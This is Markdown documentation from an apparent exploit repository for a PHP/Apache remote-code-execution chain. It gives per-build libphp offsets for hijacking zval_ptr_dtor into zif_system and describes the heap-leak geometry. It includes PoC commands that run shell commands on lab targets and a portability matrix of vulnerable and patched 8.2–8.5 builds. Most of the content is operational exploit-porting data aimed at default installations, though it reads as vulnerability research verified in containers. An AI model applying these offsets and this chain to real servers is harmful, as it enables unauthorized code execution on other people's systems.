# libphp symbol offset inventory (SAPI-independent)

Per-build `libphp.so` symbol offsets relative to the module load base.
Offsets are ASLR-independent; the runtime address is `libphp_base + offset`.

**Build identity matters more than the version string.** Match on the
`libphp.so` SHA-256 / GNU build-id, not the tag — distro backports keep the
version string while patching (USN/DSA/RHSA/ALSA). Each row below was read
with `readelf -sW` from the pinned upstream docker image.

| PHP | Image | Arch | `libphp.so` SHA-256 | build-id | `zval_ptr_dtor` | `zif_system` | `zif_passthru` | Validated fire |
|---|---|---|---|---|---|---|---|---|
| 8.4.26 | `php:8.4.26-apache` | amd64 | `51663cf883b1…` | `a534a5c4…` | `0x65EB60` | `0x465370` | `0x465380` | ✅ this repo (`poc/verify_109619_remote.py`) |
| 8.5.11 | `php:8.5.11-apache` | amd64 | `2c80ca2a245c…` | `13ba09019842…` | `0x7B47A0` | `0x5996E0` | `0x5996F0` | upstream (dinosn, in-band 12/12) |
| 8.3.35 | `php:8.3.35-apache` | amd64 | `ea069762fa22…` | `6750eb9dbdf1…` | `0x49EC50` | `0x3AC080` | `0x3AC090` | — |
| 8.2.34 | `php:8.2.34-apache` | amd64 | `42ae9f69550e…` | `432b9cdfc44a…` | `0x487650` | `0x39B8A0` | `0x39B8B0` | — |
| 8.4.26 | `php:8.4.26-apache` | arm64 | `e160c9d173be…` | `b3525423…` | `0x638120` (leak `0x63812B`) | `0x42CD70` | `0x42CD80` | ✅ this repo, **native**, 3/3 ASLR |
| 8.5.11 | `php:8.5.11-apache` | arm64 | `64a617aeb392…` | `7170455b2166…` | `0x761B80` | `0x5314F0` | — | data only; chain not reproduced |

aarch64 rows are available in `php2shell/leak.py` `OFFSETS` and the
devploit/dinosn `profiles/` directories; the rows above were re-extracted on
this host (native arm64) with `scripts/extract_offsets.sh`, see the pipeline
section below.

## Extraction pipeline (G2, 2026-10-29)

`php2shell/offsets.py` + `scripts/extract_offsets.sh` read the symbols out of
any stock apache image and merge a normalized row into `profiles/offsets.json`
(identity = SHA-256 + build-id, `validated: false` until the triad passes):

```sh
scripts/extract_offsets.sh --self-test
scripts/extract_offsets.sh --write \
    --image php:8.2.34-apache --image php:8.2.35-apache \
    --image php:8.3.35-apache --image php:8.3.36-apache \
    --image php:8.4.26-apache --image php:8.4.27-apache \
    --image php:8.5.11-apache --image php:8.5.12-apache
```

Extracted on native aarch64 (matches the amd64/arm64 rows above where they
overlap):

| build | `zval_ptr_dtor` | `zif_system` | `zif_passthru` |
|---|---|---|---|
| 8.2.34 | `0x4606C0` | `0x36FF48` | — |
| 8.2.35 (patched) | `0x465260` | `0x36F4E8` | — |
| 8.3.35 | `0x46FCC0` | `0x377428` | — |
| 8.3.36 (patched) | `0x4797A0` | `0x380888` | — |
| 8.4.1 | `0x604710` | `0x404980` | — |
| 8.4.10 | `0x60DBC0` | `0x408250` | — |
| 8.4.20 | `0x618A00` | `0x40C930` | — |
| 8.4.23 | `0x638280` | `0x42A490` | — |
| 8.4.24 | `0x63B360` | `0x42F530` | — |
| 8.4.25 | `0x637AE0` | `0x42FA30` | — |
| 8.4.26 | `0x638120` | `0x42CD70` | `0x42CD80` |
| 8.4.27 (patched) | `0x6409E0` | `0x431510` | — |
| 8.5.11 | `0x761B80` | `0x5314F0` | — |
| 8.5.12 (patched) | `0x76DE60` | `0x535490` | — |

**Leak-side bias is per-build, not per-arch.** Most builds leak the plain
`zval_ptr_dtor` symbol; 8.4.26 leaks `symbol + 0xB`. `php2shell/offsets.py`
records both (`leak_dtor`, `leak_dtor_biased`) and `remote.parse_leak` picks
the candidate that yields a page-aligned libphp base — so a new build does not
silently mis-derive the base. Patched rows are recorded for completeness; a
patched target must **block at the leak**, so it does not need a fire profile.

## Reading the table

- `zval_ptr_dtor` — the destructor the stage-3 hijack replaces; the in-band
  leak derives `libphp_base = leaked_value - zval_ptr_dtor`.
- `zif_system` — the C handler behind PHP's `system()`; the terminal call
  target (`pDestructor = libphp_base + zif_system`).
- `zif_passthru` — adjacent (`zif_system + 0x10` on these builds); a
  secondary terminal target.
- Both are LOCAL symbols on these builds; read with `nm --defined-only` or
  `readelf -sW`, not `nm -D`.

## Caveats

- **Symbol offsets are not the whole story.** The heap geometry — the
  `A2`/`B2` heap offsets (e.g. 8.4.26 `S = chunk + 0xF8398`), the
  `LEAK_SPEC`, the main-chunk bucket fingerprint (`87` on 8.4.26), and the
  stage paddings — is per-build/per-config and must be recalibrated for
  each row. A swapped offset with a stale heap offset still crashes the
  worker.
- **Allocator/address behavior is part of the proof.** dinosn's
  `REPRODUCTION.md` explicitly warns that macOS/ARM emulation is not
  suitable for an evidentiary run. This repo's 8.4.26 chain fired under
  qemu, but a per-build port must be re-verified natively before claiming a
  second validated build.

## Extraction commands (repeatable)

```sh
docker run --rm --platform linux/amd64 php:8.4.26-apache sh -c '
  sha256sum /usr/lib/apache2/modules/libphp.so;
  readelf -n /usr/lib/apache2/modules/libphp.so | grep -A1 "Build ID" | tail -1;
  readelf -sW /usr/lib/apache2/modules/libphp.so | grep -E " (zval_ptr_dtor|zif_system|zif_passthru)$";'
```

## Portability status — 2026-10-29

**Six 8.4-series builds are proven end-to-end; 8.2/8.3/8.5 and early 8.4 are
still negative at the leak shape.**

- **8.4 patch series (aarch64) — proven triad, 6/6.**
  `poc/verify_matrix.py --rows 8.4` on `lab-matrix`:
  **8.4.10, 8.4.20, 8.4.23, 8.4.24, 8.4.25, 8.4.26** each fire with
  `uid=33(www-data)`, are blocked on 8.4.27, and are prevented by `+0x1000`
  bias. The same leak shape and `S_OFF`/87-pointer geometry hold across the
  series; only the symbol offsets and the leak-side qword bias change.
- **8.4.1 (aarch64) — negative.** A1/B1 discloses, but the window yields no
  usable pointers (early-series shape difference). Excluded from the matrix.
- **8.2.34 / 8.3.35 (aarch64) — negative at the leak.** The A1/B1 shape
  returns a normal session id (no disclosure). A bounded leak-shape sweep
  (parts 700–920, depth 56/64, five `LEAK_SPEC` variants) did not disclose.
- **8.5.11 (aarch64) — negative.** Normal session id (40 B), no disclosure;
  the dinosn `target` sweep (`0..741`) also failed (STATUS P2).
- **Native amd64 ASLR (G4) — still open.** This host is arm64; amd64 runs are
  qemu-user (deterministic mmap), so they are not an ASLR proof.
- **Distro defaults (G7) — partially reproduced.** The official image with no
  `php.ini` (compiled defaults, 128M) reproduces `upload_progress=On` and the
  lengthless `post_max_size` bypass. Ubuntu 24.04's Apache 2.4.58 +
  `libapache2-mod-php` 8.3.6 parses only one field from the chunked body
  (`POST count: 1`, not "consumed") — the bypass is **not** universal across
  distro Apache builds. See `scripts/distro_defaults.sh`.

**Interpretation:** offsets *and* geometry are portable across the 8.4 patch
series (6 builds proven). The leak shape is not yet portable to 8.2/8.3/8.5 or
early 8.4. That split is the honest state of "general default installations".

### `PS(id)` ground truth (2026-10-30)

`poc/probe_ps_globals.py` reads `ps_globals.id` (`+0x10`) and the libphp base
from `/proc` in a `SYS_PTRACE` container. Measured after a producer request:

| build | `PS(id)` | chunk offset | after B1 |
|---|---|---|---|
| 8.4.26 (A1) | set | `0x137000` (stable) | reclaimed → leak |
| 8.2.34 (A1) | NULL | — | no leak |
| 8.2.34 (mod_php 2000×60) | set | `0x5b268`/`0x5c268` (varies) | no `Set-Cookie`, no cleanup |
| 8.3.35 (A1) | NULL | — | no leak |
| 8.3.35 (mod_php 2000×60) | set | `0x5b268`/`0x5c268` (varies) | no `Set-Cookie`, no cleanup |
| 8.5.11 (A1) | set | `0x136000`/`0x66080` | worker aborts (`zend_mm_heap corrupted`) |

The 8.4 leak works because the stale slot is **stable and page-aligned**;
8.2/8.3 are not, and 8.5 is DoS-only. A dense forge spray
(`D:<pages>:<step>`, 0x40–0x100, 4–20 values) also failed to produce a
`Set-Cookie` on 8.2/8.3, so the ceiling is the missing rfc1867 END cleanup,
not offset precision. This is the measured reason the matrix stops at the 8.4
series.

Repeatable:
```sh
(cd lab-pure-modphp && docker compose up -d pure-arm64 pure-arm64-patched)
python3 poc/verify_109619_remote.py --target 127.0.0.1:18130 \
    --cmd id --arch aarch64 --workers 1          # fires
python3 poc/verify_109619_remote.py --target 127.0.0.1:18131 \
    --cmd id --arch aarch64 --workers 1          # 8.4.27 blocks
```